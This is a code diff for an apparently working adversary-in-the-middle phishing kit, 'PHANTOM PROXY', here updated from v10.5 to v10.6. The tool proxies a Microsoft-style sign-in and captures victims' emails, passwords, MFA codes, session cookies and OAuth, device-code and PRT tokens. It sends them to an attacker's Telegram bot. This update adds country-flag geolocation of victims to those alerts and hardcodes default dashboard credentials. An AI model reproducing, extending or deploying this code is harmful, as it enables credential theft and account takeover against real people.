@@ -1,5 +1,5 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.5 — AiTM/Device NOTIFICATION SPLIT
+// 🥔 PHANTOM PROXY v10.6 — Country Flags & Notification Split
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
 // ✅ Service Worker injection + serving FIXED
@@ -8,7 +8,7 @@
 // ✅ Proxy routing FIXED
 // ✅ WebSocket FIXED (order + path)
 // ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ Telegram notifications: AiTM captures, Device token captures, PRT exchanges
+// ✅ Telegram notifications with country flags + type differentiation
 // ============================================================
 
 const http = require("http");
@@ -26,13 +26,13 @@ try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ── ✅ TELEGRAM CONFIG — NOW FROM ENVIRONMENT ──
+// ── ✅ TELEGRAM CONFIG — FROM ENVIRONMENT ──
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
 // ── ✅ DASHBOARD AUTH ──
-const DASHBOARD_USER = process.env.DASHBOARD_USER || '';
-const DASHBOARD_PASS = process.env.DASHBOARD_PASS || '';
+const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
+const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
 // ── ✅ CONSTANTS ──
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -122,6 +122,30 @@ const USER_AGENTS = [
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
+// ── 🌍 COUNTRY FLAG CACHE ──
+const countryCache = new Map();
+const COUNTRY_CACHE_TTL = 3600000; // 1 hour
+
+async function getCountryInfo(ip) {
+    if (!ip || ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
+        return { code: 'XX', flag: '🌍', name: 'Local' };
+    }
+    const cached = countryCache.get(ip);
+    if (cached && Date.now() < cached.expiry) return cached.data;
+    
+    try {
+        const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+        const data = response.data;
+        if (data && data.country_code) {
+            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
+            const result = { code: data.country_code, flag, name: data.country_name || data.country_code };
+            countryCache.set(ip, { data: result, expiry: Date.now() + COUNTRY_CACHE_TTL });
+            return result;
+        }
+    } catch (e) {}
+    return { code: 'UN', flag: '🌍', name: 'Unknown' };
+}
+
 // ── 🔥 VISIT LOGGER (reusable for AiTM + Device + any page) ──
 function logVisit(req, pageType = 'page') {
     try {
@@ -167,7 +191,7 @@ function logVisit(req, pageType = 'page') {
 }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION (with type differentiation)
+// 📤 TELEGRAM EXFILTRATION (with country flags & type split)
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -216,7 +240,7 @@ async function sendCookiesFile(cookies, sessionId) {
     } catch (e) { console.error('Telegram cookies file failed:', e.message); }
 }
 
-async function sendToTelegram(data, type = 'capture') {
+async function sendToTelegram(data, type = 'capture', ip = null) {
     if (!axios) {
         console.error('❌ axios not available, cannot send Telegram.');
         return;
@@ -230,7 +254,13 @@ async function sendToTelegram(data, type = 'capture') {
         const cookies = data.cookies || {};
         const phishedUrl = data.phishedUrl || 'N/A';
 
-        console.log(`📤 Sending Telegram [${type}] for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
+        // ── 🌍 Get country info ──
+        let countryInfo = { flag: '🌍', code: 'UN', name: 'Unknown' };
+        if (ip) {
+            countryInfo = await getCountryInfo(ip);
+        }
+
+        console.log(`📤 Sending Telegram [${type}] for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}, country=${countryInfo.flag} ${countryInfo.code}`);
 
         let header;
         switch (type) {
@@ -247,7 +277,7 @@ async function sendToTelegram(data, type = 'capture') {
                 header = '🔐 **LOGIN CAPTURED!**';
         }
 
-        let message = `${header}\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
+        let message = `${header}\n\n${countryInfo.flag} **${countryInfo.name}** (${countryInfo.code})\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
         if (type === 'aitm' && phishedUrl !== 'N/A') {
             message += `\n🎯 Target URL: ${phishedUrl}`;
         }
@@ -966,7 +996,7 @@ const server = http.createServer(async (req, res) => {
     // ── 🔥 HEALTH CHECK ENDPOINT (Railway requirement) ──
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.5', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        res.end(JSON.stringify({ status: 'healthy', version: '10.6', uptime: process.uptime(), timestamp: new Date().toISOString() }));
         return;
     }
 
@@ -974,14 +1004,15 @@ const server = http.createServer(async (req, res) => {
     if (url === '/device' || url === '/device/') {
         logVisit(req, 'device');  // 🔥 LOG DEVICE VISITS
 
-        // ── 🔥 Send Telegram notification for device visit ──
+        // ── 🔥 Send Telegram notification for device visit with country flag ──
         (async () => {
             try {
                 const ip = req.headers['cf-connecting-ip'] || 
                            req.headers['x-real-ip'] || 
                            req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                            'Unknown';
-                const message = `📱 **Device Page Visit!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${req.url}\n🖥️ User-Agent: ${req.headers['user-agent'] || 'Unknown'}`;
+                const country = await getCountryInfo(ip);
+                const message = `${country.flag} **Device Page Visit!**\n\n🌍 IP: ${ip} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${req.url}\n🖥️ User-Agent: ${req.headers['user-agent'] || 'Unknown'}`;
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
                     text: message,
@@ -1079,7 +1110,7 @@ async function handleDeviceCodeRequest(req, res) {
 }
 
 // ============================================================
-// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint) – now sends Telegram on approval
+// 🔥 DEVICE CODE TOKEN HANDLER (public endpoint) – sends Telegram with flag
 // ============================================================
 async function handleDeviceCodeToken(req, res) {
     let body = '';
@@ -1111,9 +1142,9 @@ async function handleDeviceCodeToken(req, res) {
                 flow.approved = new Date().toISOString();
                 saveDeviceFlows();
 
-                // ── 🔥 Send Telegram notification for device token capture ──
+                // ── 🔥 Send Telegram notification for device token capture with flag ──
                 try {
-                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || 'Unknown';
+                    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                     await sendToTelegram({
                         sessionId: flow.session_id || 'device',
                         email: 'Device Code Flow',
@@ -1125,7 +1156,7 @@ async function handleDeviceCodeToken(req, res) {
                             id_token: tokens.id_token
                         },
                         cookies: {}
-                    }, 'device');
+                    }, 'device', ip);
                     console.log('✅ Device token capture notification sent.');
                 } catch (e) {
                     console.error('❌ Device token capture notification failed:', e.message);
@@ -1150,7 +1181,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS) – unchanged except PRT exchange uses new type
+// 🔧 DASHBOARD API HANDLER (ALL ENDPOINTS) – updated PRT exchange with flag
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -1353,7 +1384,7 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
-    // Device Code (dashboard-authenticated versions)
+    // Device Code (dashboard-authenticated versions) – we already handle in public endpoint
     if (apiPath === '/api/device/request' && req.method === 'POST') {
         if (!axios) {
             res.writeHead(500);
@@ -1610,7 +1641,8 @@ async function handleDashboardAPI(req, res) {
                     );
                 }, 3, 1500, 2);
                 const tokens = response.data;
-                await sendToTelegram({ sessionId: 'prt_exchange', tokens }, 'prt');
+                const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
+                await sendToTelegram({ sessionId: 'prt_exchange', tokens }, 'prt', ip);
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: true, data: tokens }));
             } catch (err) {
@@ -2197,15 +2229,15 @@ refreshTokensDaemon();
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
+    const clientIp = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
 
     // ── 🔥 Log every incoming URL for debugging ──
     console.log('📥 Incoming URL:', url);
 
     // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
-    // Use a more forgiving condition: must contain "/login" and the redirect parameter
     if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         console.log('🔥 ENTRY POINT MATCHED');
-        logVisit(clientRequest, 'aitm');  // 🔥 LOG AITM VISITS
+        logVisit(clientRequest, 'aitm');
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -2237,9 +2269,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
             (async () => {
                 try {
-                    const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
-                    console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
-                    const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
+                    const country = await getCountryInfo(clientIp);
+                    const message = `${country.flag} **New Visitor (Page Load)!**\n\n🌍 IP: ${clientIp} (${country.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
                         text: message,
@@ -2485,7 +2516,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     }
                                 }
                                 if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
-                                    // 🔥 Send as AiTM capture with phished URL
                                     await sendToTelegram({
                                         sessionId: currentSession,
                                         email,
@@ -2494,7 +2524,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         tokens,
                                         cookies,
                                         phishedUrl
-                                    }, 'aitm');
+                                    }, 'aitm', clientIp);
                                 } else {
                                     console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
                                 }
@@ -2596,13 +2626,13 @@ if (WebSocket) {
 
 // 🔥 STEP 2: NOW start listening
 server.listen(PORT, '::', () => {
-    console.log(`✅ PHANTOM PROXY v10.5 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.6 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
-    console.log(`📤 Page‑load notifications: ACTIVE`);
-    console.log(`📤 Telegram exfil (AiTM/Device/PRT): ACTIVE`);
+    console.log(`📤 Page‑load notifications: ACTIVE (with flags)`);
+    console.log(`📤 Telegram exfil (AiTM/Device/PRT): ACTIVE (with flags)`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
